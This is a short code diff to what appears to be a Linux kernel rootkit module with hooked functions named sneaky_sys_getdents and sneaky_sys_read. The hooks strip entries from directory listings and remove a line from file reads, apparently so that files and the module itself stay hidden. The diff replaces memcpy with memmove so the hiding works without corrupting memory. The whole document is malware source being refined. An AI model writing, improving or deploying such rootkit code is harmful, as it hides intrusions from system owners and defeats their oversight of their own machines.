@@ -79,7 +79,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
       int dirent_size = d->d_reclen;
       int nrest = ((void *)dirp + nread) - ((void *)d + dirent_size);
       void *next = (void *)d + dirent_size;
-      memcpy(d, next, nrest);
+      memmove(d, next, nrest);
       nread -= dirent_size;
       continue;
     }
@@ -100,7 +100,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
       void *ed = strchr(st, '\n');
       if (ed != NULL) {
         int len = ed - st + 1;
-        memcpy(st, ed + 1, nread - (st - buf) - len + 1);
+        memmove(st, ed + 1, nread - (st - buf) - len + 1);
         nread -= len;
         is_module_open = 0;
       }
